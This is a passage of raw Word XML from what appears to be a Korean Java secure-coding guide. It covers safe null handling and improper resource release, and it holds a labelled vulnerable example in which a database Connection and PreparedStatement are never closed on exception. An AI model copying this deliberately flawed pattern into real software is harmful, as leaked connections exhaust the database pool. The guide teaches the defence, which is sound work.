                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] null </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>체크</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>후</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String name = userDao.findNameById(userId);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>if (name == null) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    name = "</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>알</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>없음</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">";  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>기본값</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>처리</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>int len = name.length();</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">// </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>또는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> Optional </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>활용</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String name = Optional.ofNullable(userDao.findNameById(userId)).orElse("</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>알</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>없음</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>");</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">  2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>부적절한</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>자원</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>해제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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>자원</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, DB </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>연결</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>소켓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등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>을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획득하여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사용한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후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반드시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해제한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>• Java</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>에서는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> try-with-resources</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>를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사용하면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자원이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자동으로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해제된다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예외</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>발생</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>자원</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>해제</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>됨</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Connection con = dataSource.getConnection();</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>PreparedStatement ps = con.prepareStatement(sql);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>ps.executeQuery();</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">// </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예외</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>발생</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> con, ps</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>해제되지</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>않아</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> DB </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>커넥션</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>고갈</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예외</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>발생</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> Connection, PreparedStatement</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>해제되지</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>않아</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> DB </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>커넥션</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
